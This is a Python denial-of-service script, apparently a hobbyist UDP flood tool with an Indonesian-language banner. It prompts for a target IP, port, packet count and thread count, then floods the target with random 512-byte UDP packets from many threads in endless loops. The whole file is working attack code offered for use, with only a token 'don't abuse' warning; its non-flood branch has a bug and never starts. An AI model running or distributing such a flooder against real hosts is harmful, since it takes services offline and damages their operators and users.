import random 
import socket
import threading
import os,sys

os.system("clear")
print("""\033[36m
  _____        __  __     _____
 |__  /___  ___\ \/ /   _|__  /
   / // _ \/ _ \\  / | | | / / 
  / /|  __/  __//  \ |_| |/ /_ 
 /____\___|\___/_/\_\__, /____|
                    |___/      """)
print("=====================================")
print("= DONTS ABUSE TOOLS                 =")
print("= JOIN MY COMMUNITY                 =")
print("= LINK COMMUNITY?                   =")
print("= PM GUA                            =")
print("=====================================")
ip = str(input("TARGET IP  :"))
port = int(input("TARGET PORT:"))
choice =str(input("GAS DDOS?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("Thread:"))
os.system("clear")
def run():
    data = random._urandom(512)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print("\033[91m MEMBANTAI IP \033[36m%s \033[91mMENINDAS PORT \033[36m%s"%(ip, port))
        except:
            print("[•] RECONECT")

def run2():
    data = random._urandom(512)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91m MEMBANTAI IP \033[36m%s \033[91mMENINDAS PORT \033[36m%s"%(ip, port))
        except:
            s.close()
            print("[•] RECONECT")

def run3():
    data = random._urandom(512)
    i = random.choice(("\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)","\033[95m[ZX] (MENGIRIM PAKET DAN)"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print("\033[91m MEMBANTAI IP \033[36m%s \033[91mMENINDAS PORT \033[36m%s"%(ip, port))
        except:
            s.close()
            print("[•] RECONECT")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th.threading.Thread(target = run3)